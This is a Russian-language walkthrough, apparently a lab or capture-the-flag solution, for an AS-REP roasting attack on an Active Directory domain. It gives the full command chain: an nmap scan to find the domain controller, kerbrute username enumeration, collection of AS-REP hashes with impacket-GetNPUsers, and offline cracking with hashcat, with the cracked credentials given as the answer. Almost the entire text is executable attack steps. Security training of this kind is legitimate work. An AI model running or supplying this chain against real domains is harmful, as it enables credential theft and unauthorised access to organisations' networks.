1. Сканируем сеть, узнаём ip-адрес контроллера домена и имя домена ($Domain_FQDN). <br>
``` sudo nmap --script whois-domain.nse 192.168.1.0/24  ```
2. Скачиваем kerbrute репозиторий, преобразуем исходный код в модули.  <br>
``` git clone git@github.com:ropnop/kerbrute.git ``` <br>
``` make all ```
3. Проведём атаку на подбор имен пользователей в домене. <br>
``` ./kerbrute_linux_amd64 userenum -d $Domain_fqdn $users_list --output $filename ``` <br> Где $Domain_fqdn - получили в 1 шаге, $users_list - список пользователей для подбора,  $filename - куда запишется результат. <br> Пример: ``` ./kerbrute_linux_amd64 userenum -d Polytech users_list.txt --output found_users.txt ``` <br>
Примечание: можно сделать и Relay на LDAP. <br>
4. Прежде чем проводить атаку следует синхронизировать время с помощью следующей команды: <br> ``` ntpdate $DC_IP ```, где $DC_IP - ip контроллера домена.
5. Отформатируем результаты прошлого шага надлежащим образом: <br>
``` cat found_users.txt | grep "VALID" | cut -f2 > formated_found_users.txt ``` <br>
Было: <br>
![<b>img1</b>](./img/img1.png) <br> Стало: <br>
![<b>img2</b>](./img/img2.png) <br>
6. С использованием полученного файла, содержащего список действительных имен, проведем атаку: <br>
``` impacket-GetNPUsers $Domain_FQDN/ -usersfile $users_list -outputfile $file ``` <br>
Пример: ``` impacket-GetNPUsers Polytech/ -usersfile formated_found_users.txt -outputfile AS_REP_hashes.txt ``` <br> Пример содержимого AS_REP_hashes.txt . <br>
![<b>img3</b>](./img/img3.png) <br>
7. Получив заветные хэши, можно осуществить оффлайн подбор пароля с помощью Hashcat: <br>
``` hashcat -m 18200 $asrep_hashes_file $dict_file ```
8. Найдённый логин и пароль и есть ответ